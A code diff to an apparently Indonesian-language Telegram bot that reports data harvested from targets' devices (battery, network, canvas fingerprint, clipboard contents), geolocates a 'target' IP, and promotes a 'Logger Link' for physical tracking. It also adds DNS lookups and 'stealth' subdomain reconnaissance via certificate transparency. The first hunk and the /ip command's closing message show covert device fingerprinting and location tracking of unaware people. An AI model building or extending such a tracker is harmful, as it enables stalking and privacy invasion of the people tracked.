@@ -627,11 +627,14 @@ async function startServer() {
         } catch(e) {}
       }
 
-      if (data.cpu_compute_score || data.perf_cores) {
-        addSection(`⚡ Performance Benchmark`,
-                   `├ Engine: <code>Audit Runtime v3</code>\n` +
-                   `├ Score: <code>${data.cpu_compute_score || 'N/A'}</code>\n` +
-                   `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
+      if (data.cpu_compute_score || data.perf_cores || data.battery || data.network || data.canvas_hash) {
+        let perfTxt = `├ Engine: <code>Audit Runtime v3</code>\n`;
+        if (data.cpu_compute_score) perfTxt += `├ Score: <code>${data.cpu_compute_score}</code>\n`;
+        if (data.perf_cores) perfTxt += `├ Resource: <code>${data.perf_cores} Cores / ${data.perf_mem} GB RAM</code>\n`;
+        if (data.battery) perfTxt += `├ Baterai: <code>${data.battery}</code>\n`;
+        if (data.network) perfTxt += `├ Jaringan: <code>${data.network}</code>\n`;
+        if (data.canvas_hash) perfTxt += `└ Canvas: <code>${data.canvas_hash}</code>`;
+        addSection(`⚡ Engine & Resource Metrics`, perfTxt);
       }
 
       if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
@@ -1443,36 +1446,37 @@ async function startServer() {
     bot.command('ip', async (ctx) => {
       const args = ctx.message.text.split(' ');
       const ip = args.length > 1 ? args[1] : '';
-      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query`;
+      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;
       
       try {
         const response = await fetch(url);
         const data = await response.json();
         if (data.status === 'success') {
           const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-          let reply = `<b>🌐 TARGET IP ANALYTICS</b>\n` +
+          let reply = `<b>🌐 TARGET IP ANALYTICS PRO</b>\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `💎 <b>QUERY:</b> <code>${data.query}</code>\n\n` +
-                      `🏢 <b>INFRASTRUKTUR:</b>\n` +
+                      `💎 <b>IP QUERY:</b> <code>${data.query}</code>\n\n` +
+                      `🏢 <b>NETWORK & INFRA:</b>\n` +
                       `├ ISP: ${data.isp || '-'}\n` +
                       `├ ORG: ${data.org || '-'}\n` +
-                      `├ ASN: ${data.as || '-'}\n` +
-                      `└ RVRS: ${data.reverse || '-'}\n\n` +
+                      `├ ASN: ${data.as || '-'} (${data.asname || '-'}) \n` +
+                      `└ REVERSE: ${data.reverse || '-'}\n\n` +
                       `📍 <b>LOKASI REGIONAL:</b>\n` +
-                      `├ NEGARA: ${data.country || '-'}\n` +
+                      `├ BENUA: ${data.continent || '-'}\n` +
+                      `├ NEGARA: ${data.country || '-'} (${data.countryCode || '-'}) \n` +
                       `├ REGION: ${data.regionName || '-'}\n` +
-                      `├ KOTA: ${data.city || '-'}\n` +
-                      `├ POS: ${data.zip || '-'}\n` +
-                      `└ TMZN: ${data.timezone || '-'}\n\n` +
-                      `🌎 <b>SPATIAL:</b>\n` +
+                      `├ KOTA/DISTRIK: ${data.city || '-'} / ${data.district || '-'}\n` +
+                      `├ KODEPOS: ${data.zip || '-'}\n` +
+                      `└ ZONA WAKTU: ${data.timezone || '-'} (GMT${data.offset/3600})\n\n` +
+                      `🌎 <b>SPATIAL & MAPS:</b>\n` +
                       `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
-                      `└ MAPS: <a href="${mapLink}">Lihat Lokasi BTS</a>\n\n` +
-                      `🛡️ <b>RISK ANALYSIS:</b>\n` +
-                      `├ MOBILE: ${data.mobile ? '✅' : '❌'}\n` +
-                      `├ PROXY/VPN: ${data.proxy ? '⚠️ DETEKSI' : '✅ BERSIH'}\n` +
-                      `└ HOSTING: ${data.hosting ? '⚠️ SERVER' : '✅ RESIDENTIAL'}\n` +
+                      `└ GMAPS: <a href="${mapLink}">Lihat Titik BTS</a>\n\n` +
+                      `🛡️ <b>RISK DETECTIONS:</b>\n` +
+                      `├ JARINGAN SELULER (4G/5G): ${data.mobile ? '✅ YA' : '❌ TIDAK'}\n` +
+                      `├ PROXY/VPN DETEKSI: ${data.proxy ? '⚠️ TERBURUK/VPN DETECTED' : '✅ BERSIH'}\n` +
+                      `└ KOMPUTER SERVER (CLOUD): ${data.hosting ? '⚠️ DATA CENTER' : '✅ RESIDENTIAL/HOME'}\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `⚠️ <i>Info: Geolocation IP mengacu pada titik registrasi provider, bukan titik GPS fisik target. Gunakan /logger untuk hasil presisi.</i>`;
+                      `⚠️ <i>Info: Geolocation IP mengacu pada titik BTS provider pusat terdekat, bukan koordinat GPS pasti perangkat. Gunakan Logger Link untuk pelacakan fisik.</i>`;
           ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
         } else {
           ctx.reply("❌ Gagal mendapatkan informasi IP.");
@@ -1520,33 +1524,38 @@ async function startServer() {
       const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
       
       try {
-        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
-        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
-        const data = await response.json();
-        if(data.status === 'OK' && data.records) {
-          let txt = `━━━━━ ᴅɴꜱ ᴍᴀᴘᴘɪɴɢ ━━━━━\n\n` +
-                    `💎 <b>ᴅᴏᴍᴀɪɴ :</b> <code>${domain}</code>\n\n`;
-          ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
-            if(data.records[type] && data.records[type].length > 0) {
-              txt += `<b>[+] ${type} ʀᴇᴄᴏʀᴅꜱ :</b>\n`;
-              data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
-                const sym = idx === arr.length - 1 ? '└' : '├';
-                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (ᴘʀɪᴏ: ${rec.priority})\n`;
-                else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
-                else txt += `${sym} <code>${rec.address || rec}</code>\n`;
-              });
-              txt += '\n';
-            }
-          });
-          txt += `━━━━━━━━━━━━━━━━━━━━\n` +
-                 `✅ <i>ꜰᴇᴛᴄʜ ᴅɴꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;
-          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
-          ctx.reply(txt, {parse_mode: 'HTML'});
-        } else {
-          ctx.reply("❌ DNS records tidak ditemukan.");
-        }
-      } catch (e) {
-        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek DNS.");
+        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b> via Cloudflare/Google DoH...`, { parse_mode: 'HTML' });
+        
+        const fetchDns = async (type: string) => {
+           try {
+               const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
+               const data = await res.json();
+               return data.Answer || [];
+           } catch { return []; }
+        };
+
+        const [a, aaaa, mx, txt, cname, ns] = await Promise.all([
+           fetchDns('A'), fetchDns('AAAA'), fetchDns('MX'), fetchDns('TXT'), fetchDns('CNAME'), fetchDns('NS')
+        ]);
+
+        let txtOutput = `<b>📡 DNS MAPPING PRO</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
+        
+        if (a.length > 0) txtOutput += `<b>[+] A RECORDS :</b>\n` + a.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+        if (aaaa.length > 0) txtOutput += `<b>[+] AAAA RECORDS :</b>\n` + aaaa.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+        if (mx.length > 0) txtOutput += `<b>[+] MX RECORDS :</b>\n` + mx.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+        if (ns.length > 0) txtOutput += `<b>[+] NS (NAME SERVERS) :</b>\n` + ns.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+        if (txt.length > 0) txtOutput += `<b>[+] TXT RECORDS :</b>\n` + txt.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+        if (cname.length > 0) txtOutput += `<b>[+] CNAME RECORDS :</b>\n` + cname.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
+
+        txtOutput += `━━━━━━━━━━━━━━━━━━━━\n` + `✅ <i>DoH Query Selesai.</i>`;
+        
+        if(txtOutput.length > 4000) txtOutput = txtOutput.substring(0, 3950) + "\n\n... (Terpotong limit)";
+        if(a.length === 0 && ns.length === 0) return ctx.reply("❌ Data DNS tidak ditemukan.");
+        ctx.reply(txtOutput, {parse_mode: 'HTML'});
+      } catch (e: any) {
+        ctx.reply(`❌ Terjadi kesalahan sistem (DoH server gagal): ${e.message}`);
       }
     });
 
@@ -1846,32 +1855,34 @@ async function startServer() {
       if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
       let domain = args[1].replace(/^https?:\/\//, '').replace(/^www\./, '');
       try {
-        ctx.reply(`🔍 Sedang menganalisa topology subdomain untuk <b>${domain}</b>...\nMohon tunggu sekitar 5-10 detik.`, {parse_mode: 'HTML'});
-        const res = await fetchWithTimeout(`https://api.hackertarget.com/hostsearch/?q=${domain}`, {}, 15000);
-        const text = await res.text();
+        ctx.reply(`🔍 Menggali data SSL/TLS topology untuk <b>${domain}</b> (Stealth crt.sh mode)...\nMohon tunggu.`, {parse_mode: 'HTML'});
+        const res = await fetchWithTimeout(`https://crt.sh/?q=%.${domain}&output=json`, {}, 25000);
+        const data = await res.json();
         
-        if (text.includes('error') || text.includes('API count exceeded')) {
-             throw new Error(text);
-        }
+        let subdomains = new Set<string>();
+        data.forEach((entry: any) => {
+           if (entry.name_value) {
+               entry.name_value.split('\n').forEach((sub: string) => {
+                   let cleanSub = sub.trim().toLowerCase();
+                   if (!cleanSub.includes('*')) subdomains.add(cleanSub);
+               });
+           }
+        });
 
-        const lines = text.split('\n').filter(l => l.trim().length > 0);
-        const subs = lines.map(line => {
-            const parts = line.split(',');
-            return parts[0];
-        }).slice(0, 30);
+        const subs = Array.from(subdomains).slice(0, 40);
 
         if(subs.length > 0) {
-          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING</b>\n` +
+          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING (STEALTH)</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
-                        `📋 <b>FOUND SUBS:</b>\n` +
+                        `📋 <b>FOUND SUBS (Top 40):</b>\n` +
                         subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                         `\n━━━━━━━━━━━━━━━━━━━━\n` +
-                        `✅ <i>Reconnaissance selesai. ${lines.length > 30 ? '(Dibatasi 30 hasil pertama)' : ''}</i>`;
+                        `✅ <i>Reconnaissance selesai. ${subdomains.size > 40 ? `(Ditemukan total ${subdomains.size} subs)` : ''}</i>`;
           ctx.reply(reply, {parse_mode: 'HTML'});
-        } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
+        } else { ctx.reply("❌ Tidak ada subdomain ditemukan dalam database certificate transparency."); }
       } catch(e: any) { 
-        ctx.reply(`❌ Gagal mencari subdomain. Server mungkin sedang sibuk atau limit tercapai. \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); 
+        ctx.reply(`❌ Gagal mencari subdomain.\n<code>${e.message}</code>`, {parse_mode: 'HTML'}); 
       }
     });
 
